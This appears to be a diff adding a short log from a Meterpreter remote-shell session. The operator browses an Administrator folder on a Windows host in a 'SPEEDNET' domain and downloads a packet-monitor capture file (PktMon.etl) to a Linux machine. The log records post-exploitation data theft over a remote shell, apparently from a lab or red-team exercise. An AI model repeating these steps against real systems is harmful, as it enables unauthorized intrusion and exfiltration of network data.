@@ -1,0 +1,15 @@
+[03/12/2024 08:25:51]   meterpreter   >
+[03/12/2024 08:25:51] cd "C:\users\Administrator.SPEEDNET/Searches"
+[03/12/2024 08:26:14]   meterpreter   >
+[03/12/2024 08:26:14] download "C:\Windows\system32\PktMon.etl" /home/ubuntu/pktmon2.etl
+[03/12/2024 08:26:15] [*] Downloading: C:\Windows\system32\PktMon.etl -> /home/ubuntu/pktmon2.etl/PktMon.etl
+[03/12/2024 08:26:15] [*] Skipped    : C:\Windows\system32\PktMon.etl -> /home/ubuntu/pktmon2.etl/PktMon.etl
+[03/12/2024 08:26:51]   meterpreter   >
+[03/12/2024 08:26:51] download "C:\Windows\system32\PktMon.etl"
+[03/12/2024 08:26:51] [*] Downloading: C:\Windows\system32\PktMon.etl -> /home/ubuntu/PktMon.etl
+[03/12/2024 08:26:52] [*] Downloaded 727.16 KiB of 727.16 KiB (100.0%): C:\Windows\system32\PktMon.etl -> /home/ubuntu/PktMon.etl
+[03/12/2024 08:26:52] [*] Completed  : C:\Windows\system32\PktMon.etl -> /home/ubuntu/PktMon.etl
+[03/12/2024 08:31:36]   meterpreter   >
+[03/12/2024 08:31:36] cd "C:\users\Administrator.SPEEDNET/Searches"
+[03/12/2024 08:31:38]   meterpreter   >
+[03/12/2024 08:31:38] ls
